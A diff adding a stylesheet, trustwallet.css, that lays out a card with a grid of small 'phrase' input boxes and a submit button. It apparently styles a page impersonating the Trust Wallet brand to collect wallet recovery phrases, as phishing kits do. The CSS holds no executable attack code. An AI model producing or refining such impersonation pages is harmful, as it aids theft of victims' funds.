@@ -1,0 +1,96 @@
+/* trustwallet.css */
+body {
+    background-color: #fff;background-image: url(/uploads/tw.png);
+    background-position: center;
+    background-repeat: repeat-y;
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-top: 5rem;
+}
+
+.container {
+    background-color: #ffffff;
+    color: white;
+    padding: 30px;
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    width: 350px;
+    text-align: center;
+}
+
+.container h2 {
+    margin-bottom: 5px;
+    font-size: 1.5em;
+}
+
+.container p {
+    margin-bottom: 20px;
+    font-size: 0.9em;
+    color: #000;
+}
+
+.phrase-input {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+    justify-content: center;
+}
+
+.phrase-input input {
+    width: 70px;
+    padding: 10px;
+    border: 1px solid #CCCCCC;
+    border-radius: 5px;
+    text-align: center;
+    color: #000;
+}
+
+.phrase-input input:focus {
+    outline: none;
+    box-shadow: 0 0 5px rgba(0, 150, 255, 1); /* Blue highlight */
+}
+
+.submit-button {
+    background-color: #0B84FF;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 5px;
+    cursor: pointer;
+    margin-top: 20px;
+    font-size: 1em;
+    transition: background-color 0.3s;
+}
+
+.submit-button:hover {
+    background-color: #0A6FD9;
+}
+
+.link {
+    color: #CCCCCC;
+    text-decoration: none;
+    display: block;
+    margin-top: 10px;
+    font-size: 0.8em;
+}
+
+.link:hover {
+    text-decoration: underline;
+}
+
+
+
+
+
+
+@media (max-width: 800px) {
+    body{
+    margin-top: 3rem;
+    }
+    .container {
+        padding: 40px 10px;
+        width: 90%;
+    }
+}
